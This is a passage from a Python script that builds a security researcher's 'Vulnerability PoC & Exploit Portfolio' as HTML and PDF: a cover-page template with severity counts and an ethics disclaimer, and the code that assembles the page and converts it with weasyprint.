          <div class="cover-stat-box" style="border-color:{SEVERITY_PALETTE[s]["border"]};">
            <div class="cover-stat-num" style="color:{SEVERITY_PALETTE[s]["border"]};">{sev_counts.get(s,0)}</div>
            <div class="cover-stat-label">{h(s)}</div>
          </div>
        </td>''' for s in stat_order
    )
    stat_cells += f'''<td class="stat-cell">
      <div class="cover-stat-box" style="border-color:{TEXT_MUTED};">
        <div class="cover-stat-num" style="color:#FFFFFF;">{total}</div>
        <div class="cover-stat-label">Total PoCs</div>
      </div>
    </td>'''
    return f'''
<div class="cover">
  <div class="cover-glow"></div>
  <div class="cover-inner">
    <div class="tlp-marking">TLP:CLEAR &mdash; UNLIMITED PUBLIC DISCLOSURE</div>
    <div class="cover-kicker">&#9656; Personal Security Research Portfolio</div>
    <h1 class="cover-title">Vulnerability PoC &amp;<br><span class="accent">Exploit Portfolio</span></h1>
    <p class="cover-subtitle">
      A curated collection of {total} proof-of-concept write-ups distilled from real,
      authorized penetration-testing engagements &mdash; every issue documented here has
      already been remediated by the affected organization. Targets, identifiers, and
      figures are generalized and fictionalized; the focus is the vulnerability
      <strong>mechanism</strong>, not any specific system.
    </p>
    <div class="cover-rule"></div>
    <table class="cover-meta-table">
      <tr><td class="mk">Author</td><td class="mv">{h(OWNER_NAME)}</td></tr>
      <tr><td class="mk">Title</td><td class="mv">{h(OWNER_TITLE)}</td></tr>
      <tr><td class="mk">Contact</td><td class="mv">{emails_line}</td></tr>
      <tr><td class="mk">Scope</td><td class="mv">E-Commerce &middot; OTT/Media &middot; NGO &middot; Cloud Infrastructure</td></tr>
      <tr><td class="mk">Document Version</td><td class="mv">1.0 &mdash; Portfolio Edition</td></tr>
    </table>
    <table class="cover-stats-row"><tr>{stat_cells}</tr></table>
    <div class="cover-notice">
      <strong>Disclosure &amp; Ethics Note:</strong> All findings below originate from
      engagements I was explicitly authorized to conduct. Each vulnerability has been
      confirmed remediated by the client prior to publication. Target names, domains,
      credentials, and record counts are fictionalized composites &mdash; nothing in
      this document identifies a real system or client, and nothing here is
      currently exploitable.
    </div>
  </div>
</div>'''


def assemble_html():
    sev_counts = {}
    for p in POCS:
        sev_counts[p["severity"]] = sev_counts.get(p["severity"], 0) + 1
    total = len(POCS)

    cards = "".join(make_poc_card(p) for p in POCS)

    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Vulnerability PoC &amp; Exploit Portfolio &mdash; {h(OWNER_NAME)}</title>
<style>
{CSS}
</style>
</head>
<body>

{make_cover(total, sev_counts)}

<div class="section">
  <div class="section-title">Proof-of-Concept Catalogue</div>
</div>

{cards}

</body>
</html>"""


if __name__ == "__main__":
    warnings = word_count_check()
    if warnings:
        print("WORD COUNT WARNINGS:")
        for w in warnings:
            print(f"  - {w}")
        print()

    html_content = assemble_html()

    html_path = f"{OUT}/VULNERABILITY_POC_EXPLOIT_PORTFOLIO_Muhammad_Huzaifa_Jamil.html"
    pdf_path = f"{OUT}/VULNERABILITY_POC_EXPLOIT_PORTFOLIO_Muhammad_Huzaifa_Jamil.pdf"

    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html_content)
    print(f"HTML written: {html_path}")

    print(f"Generating PDF: {pdf_path}")
    result = subprocess.run(
        ["python3", "-m", "weasyprint", html_path, pdf_path],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        size_kb = os.path.getsize(pdf_path) // 1024
        print(f"  PDF generated: {pdf_path}  ({size_kb} KB)")
    else:
        print(f"  ERROR generating PDF:\n{result.stderr[:3000]}")

    print("\nDone.")
